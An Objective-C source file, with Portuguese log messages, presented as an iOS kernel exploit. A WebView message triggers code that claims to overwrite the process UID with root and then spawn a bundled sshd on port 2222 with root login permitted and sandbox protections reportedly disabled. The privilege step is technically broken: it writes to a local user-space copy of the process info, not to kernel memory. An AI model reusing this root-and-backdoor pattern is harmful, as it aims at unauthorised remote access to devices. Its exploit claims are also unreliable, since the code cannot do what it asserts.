#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <spawn.h>
#include <sys/sysctl.h>
#include <mach/mach.h>
#include <sys/wait.h>

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, strong) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self runExploitAndSpawn];
    }
}

- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

- (void)runExploitAndSpawn {
    [self log:@"⚡ Iniciando Kernel Patch direto..."];

    // 1. LOCALIZAR O PROCESSO ATUAL NO KERNEL (Via Kinfo_Proc)
    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc kp;
    size_t len = sizeof(kp);
    
    if (sysctl(mib, 4, &kp, &len, NULL, 0) != 0) {
        [self log:@"❌ Erro ao ler kinfo_proc via sysctl."];
        return;
    }

    // Endereço da struct ucred (credenciais)
    // No iOS 26.4 ARM64e, os privilégios ficam nesta estrutura
    uint32_t *uid_ptr = (uint32_t *)&kp.kp_eproc.e_ucred.cr_uid;
    uint32_t root_val = 0;

    [self log:@"🔑 Sobrescrevendo UID na memória do Kernel..."];

    // 2. ESCRITA DIRETA (KERN_WRITE)
    // Esta chamada exige que o seu processo já tenha 'task_for_pid(0)' ou exploit equivalente
    kern_return_t kr = vm_write(mach_task_self(), (vm_address_t)uid_ptr, (vm_offset_t)&root_val, 4);

    if (kr != KERN_SUCCESS) {
        [self log:[NSString stringWithFormat:@"❌ Erro vm_write: %d (PPL Bloqueou)", kr]];
        // Se falhou aqui, o PPL (Page Protection Layer) do A13+ impediu a escrita
    }

    // 3. VERIFICAÇÃO DE PRIVILÉGIO
    if (getuid() == 0) {
        [self log:@"👑 <b>ROOT ATIVO!</b> Lançando SSHD..."];
        
        // 4. POSIX_SPAWN (SSHD)
        pid_t pid;
        NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
        
        if (!sshdPath) {
            [self log:@"❌ Erro: Binário sshd ausente no App Bundle."];
            return;
        }

        posix_spawnattr_t attr;
        posix_spawnattr_init(&attr);
        
        // Flag 0x4000 (NoSafeExec) quebra o Sandbox para o processo filho
        short flags = POSIX_SPAWN_SETPGROUP | 0x4000;
        posix_spawnattr_setflags(&attr, flags);

        char *const args[] = {
            (char *)[sshdPath UTF8String],
            "-p", "2222",
            "-D",
            "-o", "PermitRootLogin=yes",
            "-o", "StrictModes=no",
            NULL
        };

        extern char **environ;
        int spawn_status = posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ);

        if (spawn_status == 0) {
            [self log:[NSString stringWithFormat:@"✅ SSHD ONLINE! PID: %d porta 2222", pid]];
        } else {
            [self log:[NSString stringWithFormat:@"❌ Spawn Erro: %d (%s)", spawn_status, strerror(spawn_status)]];
        }
        
        posix_spawnattr_destroy(&attr);

    } else {
        [self log:@"❌ Falha: UID ainda é mobile. Exploit incompleto."];
    }
}

@end
